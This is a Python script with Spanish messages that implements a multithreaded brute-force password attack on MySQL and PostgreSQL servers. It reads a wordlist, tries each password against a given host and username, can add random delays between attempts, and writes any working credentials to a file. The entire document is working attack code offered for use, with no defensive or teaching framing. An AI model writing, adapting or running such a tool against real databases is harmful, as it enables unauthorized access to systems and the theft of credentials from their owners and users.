#!/usr/bin/env python3
"""
Ataque de fuerza bruta a bases de datos MySQL y PostgreSQL
"""
import mysql.connector
import psycopg2
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm

class DBAttacker:
    def __init__(self, target, port, db_type, username, wordlist, threads=4, delay=0, output=None):
        self.target = target
        self.port = port
        self.db_type = db_type.lower()
        self.username = username
        self.wordlist = wordlist
        self.threads = threads
        self.delay = delay
        self.output = output
        self.found = False
    
    def save_result(self, password):
        """Guarda credenciales encontradas"""
        result = f"[+] {self.db_type.upper()} | {self.target}:{self.port} | {self.username}:{password}\n"
        if self.output:
            with open(self.output, 'a') as f:
                f.write(result)
            print(f"💾 Credenciales guardadas en: {self.output}")
    
    def try_mysql(self, password):
        """Intenta conexión MySQL"""
        if self.delay > 0:
            time.sleep(random.uniform(0, self.delay))
        
        try:
            conn = mysql.connector.connect(
                host=self.target,
                port=self.port,
                user=self.username,
                password=password,
                connect_timeout=5
            )
            conn.close()
            return True, password
        except:
            return False, None
    
    def try_postgresql(self, password):
        """Intenta conexión PostgreSQL"""
        if self.delay > 0:
            time.sleep(random.uniform(0, self.delay))
        
        try:
            conn = psycopg2.connect(
                host=self.target,
                port=self.port,
                user=self.username,
                password=password,
                connect_timeout=5
            )
            conn.close()
            return True, password
        except:
            return False, None
    
    def attack(self):
        """Inicia ataque a base de datos"""
        print(f"🎯 {self.db_type.upper()} objetivo: {self.target}:{self.port}")
        print(f"👤 Usuario: {self.username}")
        print(f"📖 Wordlist: {self.wordlist}")
        
        # Verificar dependencias
        if self.db_type == 'mysql':
            try:
                import mysql.connector
            except ImportError:
                print("❌ mysql-connector-python no está instalado")
                print("   Instálalo con: pip install mysql-connector-python")
                return
            attack_func = self.try_mysql
        elif self.db_type == 'postgresql' or self.db_type == 'postgres':
            try:
                import psycopg2
            except ImportError:
                print("❌ psycopg2 no está instalado")
                print("   Instálalo con: pip install psycopg2-binary")
                return
            attack_func = self.try_postgresql
        else:
            print(f"❌ Tipo de DB no soportado: {self.db_type}")
            return
        
        with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f]
        
        total = len(passwords)
        print(f"📊 Total contraseñas: {total:,}")
        print(f"🚀 Iniciando ataque con {self.threads} hilos...\n")
        
        with tqdm(total=total, desc=f"Probando {self.db_type.upper()}", unit="pass") as pbar:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(attack_func, pwd): pwd for pwd in passwords}
                
                for future in as_completed(futures):
                    success, password = future.result()
                    if success:
                        print(f"\n✅ ¡ACCESO A {self.db_type.upper()} CONCEDIDO! 🎉")
                        print(f"🔓 Credenciales: {self.username}:{password}")
                        self.save_result(password)
                        self.found = True
                        executor.shutdown(wait=False)
                        break
                    pbar.update(1)
        
        if not self.found:
            print("\n❌ No se encontraron credenciales válidas")
